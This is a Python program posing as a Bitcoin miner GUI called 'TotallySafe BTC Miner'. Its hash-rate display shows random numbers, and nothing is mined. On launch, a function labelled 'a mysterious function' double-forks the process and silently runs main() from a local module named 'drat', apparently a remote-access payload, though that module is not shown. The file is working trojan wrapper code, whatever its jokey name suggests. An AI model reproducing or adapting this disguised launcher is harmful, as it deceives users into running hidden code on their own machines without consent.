#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Name: TotallySafe BTC Miner
Author: K4YT3X
Date Created: April 15, 2021
Last Updated: April 16, 2021
"""

# built-in imports
import os
import random
import sys

# third-party imports
from PIL import ImageTk, Image
import tkinter

# local imports
from drat import main as dratMain


def forkDrat():
    """a mysterious function"""
    pid = os.fork()
    if pid == 0:
        childPid = os.fork()
        if childPid == 0:
            dratMain()
        sys.exit(0)


def updateHashRate():
    """once called, this function will update
    the hash rate every second
    """
    hashingRate.set(random.randrange(90, 150))
    root.after(1000, updateHashRate)


def startMining() -> None:
    """start to mine BTCs"""
    startButton["state"] = "disabled"
    startButton["text"] = "Mining Started"
    root.after(1000, updateHashRate)


if __name__ == "__main__":
    forkDrat()

    # create a GUI window
    root = tkinter.Tk()
    root.configure(background="white")
    root.geometry("500x300")
    root.title("TotallySafe BTC Miner")

    # load TotallySafe BTC Miner logo
    canvas = tkinter.Canvas(root, width=407, height=139)
    logo = ImageTk.PhotoImage(Image.open("tsbm.png"))
    canvas.create_image(250, 25, anchor=tkinter.N, image=logo)
    canvas.pack(side="top", fill="both", expand=True)

    # create frame for hashrate label and entry
    hashRateFrame = tkinter.Frame(root)

    # hashing rate label
    hashingRateLabelText = tkinter.StringVar()
    hashingRateLabelText.set("Hashing Rate (MH/s): ")
    hashingRateLabel = tkinter.Label(
        hashRateFrame,
        textvariable=hashingRateLabelText,
        relief=tkinter.RIDGE,
        width=25,
        height=3,
    )
    hashingRateLabel.grid(row=0, column=0)

    # hashing rate value
    hashingRate = tkinter.IntVar()
    hashingRate.set(0)
    hashingRateField = tkinter.Entry(hashRateFrame, textvariable=hashingRate)
    hashingRateField.grid(row=0, column=1)
    hashRateFrame.pack(side="top", fill="both", pady=10)

    # start button
    startButton = tkinter.Button(
        root, text="Start Mining", command=startMining, height=2
    )
    startButton.pack(side="top", fill="both")

    # disable resizing
    root.resizable(False, False)

    # start main loop
    root.mainloop()
